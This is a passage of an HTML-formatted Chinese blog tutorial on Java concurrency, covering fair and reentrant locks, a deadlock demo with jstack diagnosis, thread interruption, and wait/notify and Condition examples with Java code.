class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>公平锁的tryAcquire</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">Thread</span> current <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">hasQueuedPredecessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>            <span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> acquires<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> nextc <span class="token operator">=</span> c <span class="token operator">+</span> acquires<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nextc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Maximum lock count exceeded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setState</span><span class="token punctuation">(</span>nextc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>hasQueuedPredecessors</strong> 是唯一的区别，会判断前面还有前驱节点</p><h3 id="为什么有默认设计非公平锁？"><a href="#为什么有默认设计非公平锁？" class="headerlink" title="为什么有默认设计非公平锁？"></a>为什么有默认设计非公平锁？</h3><p>1、线程的恢复挂起还是需要时间的，非公平锁就能充分利用cpu时间片，减少cpu空闲时间</p><p>2、由于一个线程在获取同步状态，再释放同步状态，非同步锁不需要考虑前驱节点，此时刚刚释放锁的线程获取同步状态的几率相对于其他线程就会非常高，减少线程的开销</p><h3 id="公平锁有什么问题？"><a href="#公平锁有什么问题？" class="headerlink" title="公平锁有什么问题？"></a>公平锁有什么问题？</h3><p>公平锁充分保证了公平性，非公平锁可能导致排队的一直在排队，导致“锁饥饿”问题</p><h3 id="公平锁和非公平锁的场景？"><a href="#公平锁和非公平锁的场景？" class="headerlink" title="公平锁和非公平锁的场景？"></a>公平锁和非公平锁的场景？</h3><p> 需要更高的效率则用非公平锁，节省了线程切换的时间，否则就使用公平锁，大家公平使用</p><h2 id="可重入锁（递归锁）"><a href="#可重入锁（递归锁）" class="headerlink" title="可重入锁（递归锁）"></a>可重入锁（递归锁）</h2><blockquote><p>Java中 synchronized和ReentrantLock都是可重入锁</p></blockquote><p> 是指同一个线程在外层方法获取锁的时候，再进入该线程的内层方法会自动获取锁(前提是锁对象得是同一个对象)，不会因为之前已经获取过锁还没有释放而阻塞</p><p>简单来说就是外层调用里面的不会因为外面的锁没有释放而造成死锁</p><p>synchronized 可重复锁演示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: 可重复锁Demo */</span><span class="token keyword">class</span> <span class="token class-name">WashClothes</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 放水     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">water</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"放水"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 洗衣服     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">wash</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"洗衣服"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReEntryLockDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">WashClothes</span> washClothes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WashClothes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            washClothes<span class="token punctuation">.</span><span class="token function">water</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ReentrantLock也是支持可重入锁的</p><blockquote><p>Lock.lock()几次 ，对应就需要Lock.unlock()几次，否则 当前线程虽然看起来程序运行没问题，但是其他线程对当前对象锁由于没有释放永远拿不到</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Lock</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: 可重复锁Demo */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReEntryLockDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"外部"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"内部"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                    lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><blockquote><p>是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeadLockDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> lockA <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> lockB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>lockA<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"持有A锁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>lockB<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"获得B锁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>lockB<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"持有B锁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>lockA<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"获得A锁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>A,B锁资源相互竞争，造成死锁</p><h3 id="死锁排查"><a href="#死锁排查" class="headerlink" title="死锁排查"></a>死锁排查</h3><p>jps -l   ：查找java相关的后台进程</p><p>jstack 进程号 ：如果有死锁 会打印 FInd Dead Lock</p><p>或者采用 jconsole 检查死锁</p><h2 id="多线程的中断机制"><a href="#多线程的中断机制" class="headerlink" title="多线程的中断机制"></a>多线程的中断机制</h2><p>首先，一个线程的停止应当自己决定自然死亡，而不应该由其他线程去stop,这也是jdk resume,stop方法废弃的原因</p><p>但实际生产中可能会由于一些原因去停止一些耗时操作，java提供了停止线程的机制——<strong>中断协商机制</strong></p><p>中断协商机制并不是立刻停止一个线程，interrupt将线程对象的<strong>中断标识设置为true</strong></p><h3 id="如何优雅的中断一个线程"><a href="#如何优雅的中断一个线程" class="headerlink" title="如何优雅的中断一个线程"></a>如何优雅的中断一个线程</h3><ul><li><p>通过一个volatile变量实现。可见性机制设立标志。</p></li><li><p>通过AtomicBoolean变量实现， 类似，也是标志位方式来退出</p></li><li><p>使用Thread.interrupt来设置中断标志位为true,结合isInterrupted使用</p><p>注意：1、interrupt只是设置中断标识位，不会立即停止线程</p><p>​2、线程死亡isInterrupted，也是返回false</p><p>​3、<strong>如果线程处理被阻塞状态（sleep，wait , join等状态），在别的线程中调用当前线程的interrupt，会立即退出被阻塞状态，将中断标志位清除，设置为false,并抛出interruptException</strong>  </p><p>解决办法：捕获interruptException，再执行一次interrupt，将中断标志位设置为true</p></li></ul><p>Thread.interrupted()返回线程的线程中断状态，并清除。类似于i++</p><h2 id="线程的等待与唤醒"><a href="#线程的等待与唤醒" class="headerlink" title="线程的等待与唤醒"></a>线程的等待与唤醒</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>方式一：使用Object的wait()方法让线程等待，使用Object中的notify() 方法唤醒线程</li><li>方式二：使用JUC包中的Condition的await()方法让线程等待，使用signal()方法唤醒线程</li><li>方式三：LockSupport类可以park等待和unpark唤醒</li></ul><h3 id="wait和notify"><a href="#wait和notify" class="headerlink" title="wait和notify"></a>wait和notify</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Condition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Lock</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LockSupportDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> objectLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Condition</span> condition <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>objectLock<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"进入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    objectLock<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"被唤醒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>             <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>objectLock<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                objectLock<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"发出通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>1、wait notify  synchronized 要一起使用，如果wait没在synchronized中包着使用，会抛出异常</p><p>2、wait和notify顺序不能变，否则会不起作用</p><h3 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Condition</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Lock</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LockSupportDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> objectLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Condition</span> condition <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span 